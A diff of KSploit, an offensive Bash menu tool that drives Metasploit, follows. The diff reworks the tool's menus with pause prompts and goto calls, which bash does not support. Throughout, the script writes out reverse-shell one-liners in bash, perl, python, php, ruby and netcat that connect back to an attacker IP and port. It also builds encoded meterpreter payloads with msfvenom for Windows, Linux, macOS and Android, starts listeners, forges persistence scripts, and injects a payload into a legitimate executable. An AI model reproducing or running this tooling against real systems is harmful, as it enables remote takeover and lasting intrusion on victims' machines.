@@ -10,13 +10,11 @@
 # -H = $HOST = host
 # -i = $IP = ip
 # -o = $OUTPUT = output file
-switch=$1
 ADDR=$(ip addr | grep tun0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
 EADDR=$(ip addr | grep eth0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
 WADDR=$(ip addr | grep wlan0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
 ME="$(whoami) 👽 $(hostname)"
 ME=$(echo $ME | tr '[:lower:]' '[:upper:]')
-SERVICE=service;
 wdir=$(pwd)
 
 ###########################################
@@ -74,6 +72,22 @@ locals()
     return 
 }
 
+errors()
+{
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi
+   return 
+}
+
+bye()
+{
+  echo  "${YELLOW}	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
+}
+
 ################################################################################
 # Shells Menu
 ################################################################################
@@ -90,6 +104,9 @@ echo ${YELLOW}"
 	"${LIGHT_MAGENTA}
    echo "  Use the shells menu to quickly and easily craft shell code and scripts. Choose from Bash, PERL, Ruby, PHP, python and necat options.  ${YELLOW}" |fmt -w 60
    echo
+   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+   #shelly:
+   clear
    echo ${YELLOW}
    echo "	   _____________________________________________"
    echo "	  |${FGG}       KSploit Shells Menu Options:          ${NC}${YELLOW}|"
@@ -113,12 +130,7 @@ echo ${YELLOW}"
    echo
    echo "     if you need an advanced php shell, go here:    "
    echo "     https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}" |fmt -w 80
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi  
+   errors	
    echo "${GREEN}"
    read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,6,7,q]    " opt
    echo
@@ -140,8 +152,8 @@ echo ${YELLOW}"
 	    chmod +x $wdir/shell.sh
 	    echo
 	    echo -e "         or run ${LIGHT_CYAN}bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1${GREEN} on the target machine" &
-  	    sleep 5
-            shells
+	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+            goto shelly;
 	  ;;
 	2)
 	    touch $wdir/shell.pl
@@ -149,7 +161,7 @@ echo ${YELLOW}"
             echo "              ${FGC}   Crafting a PERL Shell script   :   ${NC}${YELLOW}"
 	    read -p '	    Set Attacker IP* ' attackerip
     	    read -p '	    Set Attacker Port* ' attackerport
-   	    echo "	    🦪🦪🦪 Generating perl shell script ..."	
+  	    echo "	    🦪🦪🦪 Generating perl shell script ..."	
 	    echo -e "perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > $wdir/shell.pl
 	    echo
 	    sleep 1		    
@@ -157,8 +169,8 @@ echo ${YELLOW}"
 	    chmod +x $wdir/shell.pl
 	    echo	
 	    echo -e "         or run ${LIGHT_CYAN}perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${GREEN} on the target machine" &
-  	    sleep 5
-            shells
+	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+            goto shelly;
 	  ;;
 	3)
 	    touch $wdir/shell.py
@@ -174,8 +186,8 @@ echo ${YELLOW}"
 	    chmod +x $wdir/shell.py
 	    echo
 	    echo -e "         or run ${LIGHT_CYAN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine" &
-  	    sleep 5
-            shells
+	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+            goto shelly;
 	  ;;
 	 4)
 	    touch $wdir/shell3.py
@@ -191,8 +203,8 @@ echo ${YELLOW}"
 	    chmod +x $wdir/shell3.py
 	    echo
 	    echo -e "         or run ${LIGHT_CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine" &
-  	    sleep 5
-            shells
+	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+            goto shelly;
 	  ;;
 	5) 
 	    touch shell.php
@@ -202,8 +214,8 @@ echo ${YELLOW}"
 	    echo -e "or run ${LIGHT_CYAN}php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${GREEN} on the target machine"
 	    echo "${LIGHT_MAGENTA}     if you need an advanced php shell, go here:    "
 	    echo "https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}" &
-  	    sleep 5
-            shells
+	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+            goto shelly;
 	  ;; 
 	6)
 	    touch shell.rb
@@ -211,17 +223,66 @@ echo ${YELLOW}"
 	    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > shell.rb
 	    echo -e "${DG} - - - -> Ruby Shell script saved to $wdir/shell.rb"${GREEN}
 	    echo -e "or run ${LIGHT_CYAN}ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${GREEN} on the target machine" &
-  	    sleep 5
-            shells
+	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+            goto shelly;
 	 ;;					    
 	 7) 
-	    touch netcat.sh
-	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-	    echo -e "nc -e /bin/sh $attackeip $attackeport" > netcat.sh
-	    echo -e "${DG} - - - -> Bash Shell script saved to $wdir/netcat.sh ((RUN WITH ./netcat.sh on the target))"${GREEN}
-	    echo -e "or run ${LIGHT_CYAN}nc -e /bin/sh $attackeip $attackeport ${GREEN}on the target machine" &
-  	    sleep 5
-            shells
+	    touch $wdir/netcat.sh
+            echo
+            echo "              ${FGC} Crafting a Netcat Shell script   :   ${NC}${YELLOW}"
+	    read -p '	    Set Attacker IP* ' attackerip
+    	    read -p '	    Set Attacker Port* ' attackerport
+   	    echo -e "	    🐱🐱🐱 Generating netcat shell script ..."	
+	    echo -ne '            🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+   	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    sleep .1
+	    echo -ne '            🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱🐱\r'
+	    echo -e "           ${DG} 🐱🐱🐱 Netcat Shell script saved to $wdir/netcat.sh "
+	    echo -e "            ${DG}((RUN WITH ./netcat.sh on the target))"${GREEN}
+	    echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerip $attackerport >/tmp/f" > $wdir/netcat.sh
+	    echo -e "            or run: ${LIGHT_CYAN} "
+	    echo
+	    echo -e "        ${FGC}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerip $attackerport >/tmp/f ${NC}${GREEN}" '\n\n' "           on the target machine"
+	    echo
+	    pause  '          '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+	    goto shelly;
 	  ;;
          q)
 	    clear
@@ -230,7 +291,7 @@ echo ${YELLOW}"
  	 *)
 	    clear 
 	    error="$opt is not a valid option!"      	
-	    shells
+	    goto shelly;
 	 ;;
     esac
 
@@ -241,8 +302,8 @@ echo ${YELLOW}"
 ################################################################################
 payloads()
 {
-	clear
-	echo ${LIGHT_CYAN}'
+  clear
+  echo ${LIGHT_CYAN}'
    ____             _                 _     
   |  _ \ __ _ _   _| | ___   __ _  __| |___ 
   | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
@@ -253,6 +314,9 @@ payloads()
  '${LIGHT_MAGENTA} 
    echo "  Use the payloads menu to quickly and easily craft metasploit payloads for a wide variety of targets." |fmt -w 60
    echo
+   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+   #pay:
+   clear
    echo ${YELLOW}
    echo "	   _____________________________________________"
    echo "	  |${FGG}        KSploit Payloads Menu Options:       ${NC}${YELLOW}|"
@@ -270,12 +334,7 @@ payloads()
    echo "	  |    🚪${GREEN} q ${BLUE}Quit to main menu.                  ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi  
+   errors
    echo "${GREEN}"
    read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,q]    " opt
    echo
@@ -296,8 +355,8 @@ payloads()
 	  echo "	    💰💰💰 Generating mac osx payload ..."	
 	  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > $wdir/shell.macho
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.macho saved   💰💰💰   ${NC}${GREEN}" &
-	  sleep 2
-          payloads
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+          goto pay;
 	;;
 	4)
           echo
@@ -307,8 +366,8 @@ payloads()
 	  echo "	    💰💰💰 Generating android meterpreter payload ..."	
 	  msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > $wdr/shell.apk
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.apk saved   💰💰💰   ${NC}${GREEN}" &
-	  sleep 2
-          payloads
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+          goto pay;
 	;;  
 	5)
 	  echo
@@ -318,8 +377,8 @@ payloads()
 	  echo "	    💰💰💰 Generating reverse python payload ..."	
 	  msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > $wdir/shell.py
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.py saved   💰💰💰   ${NC}${GREEN}" &
-	  sleep 2
-          payloads
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+          goto pay;
 	;;
         q)
           clear
@@ -328,7 +387,7 @@ payloads()
         *)
           clear 
           error="$opt is not a valid option!"      	
-          payloads
+          goto pay;
         ;;
    esac    
 }
@@ -338,8 +397,8 @@ payloads()
 ################################################################################
 linpayloads()
 {
-	clear
-	echo ${LIGHT_CYAN}'
+  clear
+  echo ${LIGHT_CYAN}'
    ____             _                 _        
   |  _ \ __ _ _   _| | ___   __ _  __| |___ 
   | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
@@ -350,6 +409,9 @@ linpayloads()
 '${LIGHT_MAGENTA}
    echo "  Use the linux payloads menu to quickly and easily craft metasploit payloads for linux targets." |fmt -w 60
    echo
+   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+   #linpay:
+   clear
    echo ${YELLOW}
    echo "	   _____________________________________________"
    echo "	  |${FGG}      KSploit Linux Payloads Menu Options:   ${NC}${YELLOW}|"
@@ -361,12 +423,7 @@ linpayloads()
    echo "	  |    🚪${GREEN} q ${BLUE}Quit to payloads menu.              ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi  
+   errors
    echo "${GREEN}"
    read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
    echo
@@ -381,8 +438,8 @@ linpayloads()
 	  echo "	    💰💰💰 Generating linux x86 meterpreter payload ..."	
 	  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell.elf
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.elf saved   💰💰💰   ${NC}${GREEN}" &
-	  sleep 2
-	  payloads
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+	  goto linpay;
 	;;
 	2)
 	  echo 
@@ -392,8 +449,8 @@ linpayloads()
 	  echo "	    💰💰💰 Generating linux x64 meterpreter payload ..."	
 	  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell64.elf
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.elf saved   💰💰💰   ${NC}${GREEN}" &
-	  sleep 2
-	  payloads
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+	  goto linpay;
 	;;
 	q)
 	  clear
@@ -401,8 +458,8 @@ linpayloads()
 	;;
 	*)
           clear 
-          error="$opt is not a valid option!"      	
-          linpayloads
+          errorq="$opt is not a valid option!"      	
+          goto linpay;
 	;;
    esac
 }
@@ -412,8 +469,8 @@ linpayloads()
 ################################################################################
 winpayloads()
 {
-	clear
-	echo ${LIGHT_CYAN}'
+  clear
+  echo ${LIGHT_CYAN}'
    ____             _                 _        
   |  _ \ __ _ _   _| | ___   __ _  __| |___ 
   | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
@@ -424,6 +481,9 @@ winpayloads()
 '${LIGHT_MAGENTA}
    echo "  Use the windows payloads menu to quickly and easily craft metasploit payloads for windows targets." |fmt -w 60
    echo
+   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+   #winpay:
+   clear
    echo ${YELLOW}
    echo "	   _____________________________________________"
    echo "	  |${FGG}    KSploit Windows Payloads Menu Options:   ${NC}${YELLOW}|"
@@ -435,12 +495,7 @@ winpayloads()
    echo "	  |    🚪${GREEN} q ${BLUE}Quit to payloads menu.              ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi  
+   errors
    echo "${GREEN}"
    read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
    echo
@@ -456,8 +511,8 @@ winpayloads()
 	  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > $wdir/shell.exe
 	  echo
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.exe saved   💰💰💰   ${NC}${GREEN}" &
-	  sleep 2
-	  payloads
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+	  goto winpay;
 	;;
 	2)
 	  echo 
@@ -468,8 +523,8 @@ winpayloads()
 	  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > $wdir/shell64.exe
 	  echo
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.exe saved   💰💰💰   ${NC}${GREEN}" &
-	  sleep 2
-	  payloads
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+	  goto winpay;
 	;;
 	q)
 	  clear
@@ -478,7 +533,7 @@ winpayloads()
 	*)
           clear 
           error="$opt is not a valid option!"      	
-          winpayloads
+          goto winpay;
 	;;
    esac
 }
@@ -488,8 +543,8 @@ winpayloads()
 ################################################################################
 listeners()
 {
-        clear
-echo ${LIGHT_CYAN}'
+  clear
+  echo ${LIGHT_CYAN}'
    _     _     _                           
   | |   (_)___| |_ ___ _ __   ___ _ __ ___ 
   | |   | / __| __/ _ \\ '_ \\ / _ \\ '__/ __|
@@ -499,6 +554,9 @@ echo ${LIGHT_CYAN}'
 '${LIGHT_MAGENTA}
    echo "  Use the listeners menu to craft and quickly deploy metasploit listeners." |fmt -w 60
    echo
+   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+   #listen:
+   clear
    echo ${YELLOW}
    echo "	   _____________________________________________"
    echo "	  |${FGG}      KSploit Listeners Menu Options:        ${NC}${YELLOW}|"
@@ -514,12 +572,7 @@ echo ${LIGHT_CYAN}'
    echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi  
+   errors
    echo "${GREEN}"
    read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
    echo
@@ -546,7 +599,7 @@ echo ${LIGHT_CYAN}'
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
             cat $wdir/meterpreter_windows.rc | xterm -e msfconsole -r $wdir/meterpreter_windows.rc &
 	    sleep 2
-            listeners	
+            goto listen;
             ;;
         2)
             echo
@@ -568,7 +621,7 @@ echo ${LIGHT_CYAN}'
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
             cat $wdir/meterpreter_linux.rc | xterm -e msfconsole -r $wdir/meterpreter_linux.rc &
 	    sleep 2
-            listeners
+            goto listen;
             ;;
         3)
             echo
@@ -590,7 +643,7 @@ echo ${LIGHT_CYAN}'
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
             cat $wdir/meterpreter_mac.rc | xterm -e msfconsole -r $wdir/meterpreter_mac.rc &
 	    sleep 2
-            listeners
+            goto listen;
             ;;
         4)
             echo
@@ -611,7 +664,7 @@ echo ${LIGHT_CYAN}'
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
             cat $wdir/meterpreter_droid.rc | xterm -e msfconsole -r $wdir/meterpreter_droid.rc &
 	    sleep 2
-            listeners
+            goto listen;
             ;;  
          q)
             clear
@@ -620,7 +673,7 @@ echo ${LIGHT_CYAN}'
          *)
            clear 
            error="$opt is not a valid option!"      	
-           listeners
+           goto listen;
          ;;
     esac
 }     
@@ -634,6 +687,7 @@ mfconsole()
   echo "${YELLOW}          --> Migrating to metasploit-framework ..."
   echo
   sudo msfdb run
+  bye
   tput sgr0 
   exit 1;
 }	  
@@ -654,6 +708,9 @@ echo "  ⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛
 echo ${LIGHT_MAGENTA} 
 echo "  Use the persistence menu to quickly forge persistence scripts. Currently supports windows and android scripts." |fmt -w 60
 echo
+pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+#stay:
+clear
 echo ${YELLOW}
 echo "	   _____________________________________________"
 echo "	  |${FGG}       KSploit Persistence Menu Options:     ${NC}${YELLOW}|"
@@ -665,12 +722,7 @@ echo "	  |---------------------------------------------|"
 echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
 echo "	  |_____________________________________________${YELLOW}|${GREEN}"
 echo	
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi  
+   errors
    echo "${GREEN}"
    read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
    echo
@@ -689,8 +741,8 @@ echo
     	  echo -e "                                                                          "  
           echo -e " ${FGC} run persistence -U -X -i $attinterval -r $attackerip -p $attackerport ${NC}${YELLOW} " | fmt -s -w 80
   	  echo 
-	  echo  "${YELLOW}	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
-	  exit 1
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+          goto stay;
 	;;
         2)
           echo "         ${FGC}     Forging an Android Persistence Script :     ${NC}${YELLOW}"
@@ -705,8 +757,8 @@ echo
           echo -e "          ⌛⌛⌛ Your Persistence Script saved to $wdir/android.sh "
           echo -e "                Upload it to / on target android device${NC}" 
   	  echo 
-	  echo  "${YELLOW}	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
-	  exit 1
+          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+          goto stay;
         ;;  
 	q)
 	  clear
@@ -715,7 +767,7 @@ echo
 	*)
           clear 
           error="$opt is not a valid option!"      	
-          persist
+          goto stay;
 	;;
     esac
 }
@@ -725,14 +777,9 @@ echo
 ################################################################################
 malexe()
 {
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi  
    echo
 	clear 
+	errors
 	echo
 	echo 
 	echo -e "          ${BLUE}  -------------------------------------------------------------"
@@ -751,13 +798,60 @@ malexe()
 	read -p '   	       Output filename ' outputname
 	echo 
 	echo -e "               💉💉💉 Injecting payload into $outputname ..."
-	echo $exepath
-	sleep 2
-	echo "msfvenom --platform windows -x $exepath -k -p windows/x64/meterpreter/reverse_tcp  lhost=$attackerip lport=$attackerport -b "\x00" -e x64/xor -i 39 -f exe" | fmt 
+#	echo $exepath
 	echo `msfvenom --platform windows -x $exepath -k -p windows/x64/meterpreter/reverse_tcp  lhost=$attackerip lport=$attackerport -b "\x00" -e x64/xor -i 39 -f exe -o $wdir/$outputname`
-	echo -e "         ${FGG}${YELLOW}   💉💉💉   $wdir/$outputname saved   💉💉💉   ${NC}${LIGHT_CYAN}" &
-	sleep 40
-	clear
+	if [ -f "${outputname}" ]
+	then
+	echo -ne '           💉\r'
+	sleep .1
+	echo -ne '           💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	sleep .1
+	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
+	echo -ne "         ${FGG}${YELLOW} 💉💉💉 $wdir/$outputname saved 💉💉💉   ${NC}${LIGHT_CYAN}"'\r' &
+	sleep 4
+	echo
+	echo
+	pause  '           '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+	else 
+	   echo "${RED}ERROR............"	
+	pause  '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
+	fi   
 	goto start;
   exit 1; 
 
@@ -775,7 +869,7 @@ clear
 	echo -e "${RED} ##################################################"
 	echo -e " #${FGR}${LG}   💀 Must run as root (sudo ./ksploit.sh) 💀   ${NC}${RED}#" 
 	echo -e " ##################################################"
-	echo -e '      👋              Goodbye              👋'
+	bye
 	echo
   exit 1; 
 }
@@ -846,6 +940,7 @@ function pause(){
    echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
    echo -ne '                    🕵🔎 Courtesy of KaotickJ 👽\r'${NC}
    #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
+   sleep .5
    echo "${LIGHT_MAGENTA}  "
    echo
    echo "  KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits" |fmt -w 60
@@ -869,19 +964,14 @@ function pause(){
    echo "	  |---------------------------------------------|"
    echo "	  |    ⌛${GREEN} 5 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    ▶️ ${GREEN} m ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
+   echo "	  |    ▶️ ${GREEN} M ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}Quit.                               ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
 #   locals	
    echo ${NC}
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi  
+   errors
    echo "${GREEN}"
    read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,m,q]    " opt
    case "$opt" in
@@ -895,13 +985,13 @@ function pause(){
          ;;
        5) persist
          ;;
-       m) mfconsole
+       M) mfconsole
          ;;
        q)
 	echo 
 	echo 
 	echo ${YELLOW}
-	echo  "	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
+	bye
 	echo 
 	echo 
 	exit 1
